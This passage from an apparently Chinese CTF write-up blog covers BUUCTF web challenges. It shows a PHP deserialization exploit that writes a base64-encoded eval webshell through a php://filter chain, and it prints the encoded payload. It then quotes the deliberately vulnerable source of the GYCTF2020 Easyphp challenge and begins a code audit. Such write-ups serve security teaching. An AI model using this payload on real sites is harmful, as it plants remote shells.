class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;options[<span class="string">'prefix'</span>] = <span class="string">"php://filter/write=convert.base64-decode/resource="</span>;</span><br><span class="line">$b-&gt;options[<span class="string">'expire'</span>] = <span class="number">11</span>;</span><br><span class="line">$b-&gt;options[<span class="string">'data_compress'</span>] = <span class="keyword">false</span>;</span><br><span class="line">$b-&gt;options[<span class="string">'serialize'</span>] = <span class="string">'strval'</span>;</span><br><span class="line">$a-&gt;start($b);</span><br><span class="line">$object = <span class="keyword">array</span>(<span class="string">"path"</span>=&gt;<span class="string">"PD9waHAgQGV2YWwoJF9QT1NUWzEyM10pOz8+"</span>);</span><br><span class="line">$path = <span class="string">'111'</span>;</span><br><span class="line">$a-&gt;cache = <span class="keyword">array</span>($path=&gt;$object);</span><br><span class="line">$a-&gt;complete = <span class="string">'2'</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">O<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>A<span class="symbol">%22</span>A<span class="symbol">%22</span><span class="symbol">%3</span>A<span class="number">5</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bs<span class="symbol">%3</span>A<span class="number">8</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span><span class="symbol">%2</span>A<span class="symbol">%00</span><span class="keyword">store</span><span class="symbol">%22</span><span class="symbol">%3</span>BO<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>A<span class="symbol">%22</span>B<span class="symbol">%22</span><span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bs<span class="symbol">%3</span>A<span class="number">7</span><span class="symbol">%3</span>A<span class="symbol">%22</span>options<span class="symbol">%22</span><span class="symbol">%3</span>Ba<span class="symbol">%3</span>A<span class="number">4</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bs<span class="symbol">%3</span>A<span class="number">6</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="keyword">prefix</span><span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">50</span><span class="symbol">%3</span>A<span class="symbol">%22</span>php<span class="symbol">%3</span>A<span class="symbol">%2</span>F<span class="symbol">%2</span>Ffilter<span class="symbol">%2</span>Fwrite<span class="symbol">%3</span>Dconvert.base<span class="number">64</span>-decode<span class="symbol">%2</span>Fresource<span class="symbol">%3</span>D<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">6</span><span class="symbol">%3</span>A<span class="symbol">%22</span>expire<span class="symbol">%22</span><span class="symbol">%3</span>Bi<span class="symbol">%3</span>A<span class="number">11</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">13</span><span class="symbol">%3</span>A<span class="symbol">%22</span>data_compress<span class="symbol">%22</span><span class="symbol">%3</span>Bb<span class="symbol">%3</span>A<span class="number">0</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">9</span><span class="symbol">%3</span>A<span class="symbol">%22</span>serialize<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">6</span><span class="symbol">%3</span>A<span class="symbol">%22</span>strval<span class="symbol">%22</span><span class="symbol">%3</span>B<span class="symbol">%7</span>D<span class="symbol">%7</span>Ds<span class="symbol">%3</span>A<span class="number">6</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span><span class="symbol">%2</span>A<span class="symbol">%00</span>key<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">6</span><span class="symbol">%3</span>A<span class="symbol">%22</span>pz.php<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">9</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span><span class="symbol">%2</span>A<span class="symbol">%00</span>expire<span class="symbol">%22</span><span class="symbol">%3</span>BN<span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">5</span><span class="symbol">%3</span>A<span class="symbol">%22</span>cache<span class="symbol">%22</span><span class="symbol">%3</span>Ba<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bi<span class="symbol">%3</span>A<span class="number">111</span><span class="symbol">%3</span>Ba<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bs<span class="symbol">%3</span>A<span class="number">4</span><span class="symbol">%3</span>A<span class="symbol">%22</span>path<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">36</span><span class="symbol">%3</span>A<span class="symbol">%22</span>PD<span class="number">9</span>waHAgQGV<span class="number">2</span>YWwoJF<span class="number">9</span>QT<span class="number">1</span>NUWzEyM<span class="number">10</span>pOz<span class="number">8</span><span class="symbol">%2</span>B<span class="symbol">%22</span><span class="symbol">%3</span>B<span class="symbol">%7</span>D<span class="symbol">%7</span>Ds<span class="symbol">%3</span>A<span class="number">8</span><span class="symbol">%3</span>A<span class="symbol">%22</span>complete<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>A<span class="symbol">%222</span><span class="symbol">%22</span><span class="symbol">%3</span>B<span class="symbol">%7</span>D</span><br></pre></td></tr></table></figure>

<p>最后get传参得到shell<br><img src="/2020/04/14/BUU-web4/2.png" alt></p>
<h1 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h1><p>进入题目为一个登陆框，SQL注入无果，扫目录发现<a href="http://www.zip源码泄露" target="_blank" rel="noopener">www.zip源码泄露</a><br><img src="/2020/04/14/BUU-web4/3.png" alt><br>login.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'lib.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#HTML code.......</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$user=<span class="keyword">new</span> user();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">"/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i"</span>, $_POST[<span class="string">'username'</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"&lt;br&gt;Damn you, hacker!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">"/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i"</span>, $_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"Damn you, hacker!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$user-&gt;login();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;</span><br></pre></td></tr></table></figure>

<p>update.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'lib.php'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset="utf-8"&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">'login'</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"你还没有登陆呢！"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">	<span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"lib.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]))&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="keyword">__DIR__</span>.<span class="string">"/"</span>.$_GET[<span class="string">'action'</span>].<span class="string">".php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./index.php?action=update'&lt;/script&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./index.php?action=login'&lt;/script&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>lib.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($parm)</span></span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">'union'</span>,<span class="string">'regexp'</span>,<span class="string">'load'</span>,<span class="string">'into'</span>,<span class="string">'flag'</span>,<span class="string">'file'</span>,<span class="string">'insert'</span>,<span class="string">"'"</span>,<span class="string">'\\'</span>,<span class="string">"*"</span>,<span class="string">"alter"</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">'hacker'</span>,$parm);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">        $mysqli=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=$mysqli-&gt;login(<span class="string">'select id,password from user where username=?'</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;id)&#123;</span><br><span class="line">        $_SESSION[<span class="string">'id'</span>]=<span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        $_SESSION[<span class="string">'login'</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你的ID是"</span>.$_SESSION[<span class="string">'id'</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你好！"</span>.$_SESSION[<span class="string">'token'</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./update.php'&lt;/script&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">'id'</span>],$Info,<span class="string">"update user SET age=$age,nickname=$nickname where id="</span>.$_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $age=$_POST[<span class="string">'age'</span>];</span><br><span class="line">        $nickname=$_POST[<span class="string">'nickname'</span>];</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname);<span class="comment">//危</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"0-0"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age,$nickname)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$argument)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($newInfo,$sql)</span></span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">"127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">"test"</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">'username'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">'password'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=$_SESSION[<span class="string">'token'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"连接失败，错误:"</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">'s'</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'用户不存在!'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'密码错误！'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">'token'</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//还没来得及写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码审计：</p>
<p>首先在update.php页面：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'lib.php'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset="utf-8"&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">'login'</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"你还没有登陆呢！"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">	<span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>当$_SESSION[‘login’]等于1的时候登陆成功，并且获得flag。接下来就寻找它什么时候等于1。<br>在lib.php中的User类里面可以看到：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">        $mysqli=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=$mysqli-&gt;login(<span class="string">'select id,password from user where username=?'</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;id)&#123;</span><br><span class="line">        $_SESSION[<span class="string">'id'</span>]=<span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        $_SESSION[<span class="string">'login'</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你的ID是"</span>.$_SESSION[<span class="string">'id'</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你好！"</span>.$_SESSION[<span class="string">'token'</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./update.php'&lt;/script&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>if判断$this-&gt;id是否为真，如果为真便成功登陆，$this-&gt;id是通过mysqli调用login方法，而$mysqli是new的一个dbCtrl对象，即$this-&gt;id是调用的dbCtrl类中的login方法，这里的’select id,password from user where username=?’便是dbCtrl::login中的$sql参数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">"127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">"test"</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">'username'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">'password'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=$_SESSION[<span class="string">'token'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"连接失败，错误:"</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">'s'</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'用户不存在!'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'密码错误！'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">'token'</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//还没来得及写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是我们首先需要调用User类，才可以动这里的mysql，然后发现在login.php中new了一个user类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$user=<span class="keyword">new</span> user();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">"/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i"</span>, $_POST[<span class="string">'username'</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"&lt;br&gt;Damn you, hacker!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">"/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i"</span>, $_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"Damn you, hacker!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$user-&gt;login();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里限制了POST传入的username，当传入的username通过正则后便可以进入user类的login方法。进入之后会检测是否传入username和password参数，然后便进入到了dbCtrl::login中，然后以’select id,password from user where username=?’作为$sql 参数，这里的<code>?</code>是pdo数据查询特有的占位符。<br>当$sql参数传入时进行了占位符的替换,将<code>?</code>替换为$this-&gt;name，也就是我们POST传入的username。这里其实执行的就是一个sql查询，你输入了username，后台会查询这个对应名字的密码，返回的是$idResult和$passwordResult结果。然后会把输入的password的md5值和后台比较，如果存在该用户名就会给你返回id序列号和密码，如果不存在或者密码错误，那只能返回false。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">$result-&gt;bind_param(<span class="string">'s'</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">$result-&gt;execute();</span><br><span class="line">$result-&gt;bind_result($idResult, $passwordResult);</span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/zhouguowei/p/5212994.html" target="_blank" rel="noopener">[PHP PDO prepare()、execute()和bindParam()方法详解]</a></p>
<p>这时候看到了UpdateHelper和类还没有用，仔细看一下发现Info类里面的call方法触发后会调用CtrlCase属性然后又调用了login方法，但是我们知道属性不能调用方法，只有对象才可以直接调用，这里有点懵了，然后回去看了一下前面时怎么调用login方法的: <code>$mysqli=new dbCtrl(); $this-&gt;id=$mysqli-&gt;login(&#39;select id,password from user where username=?&#39;);</code>发现时先new了一个类成为一个对象再去调用，所以这里我们应该要先吧$this-&gt;CtrlCase变成一个对象。</p>
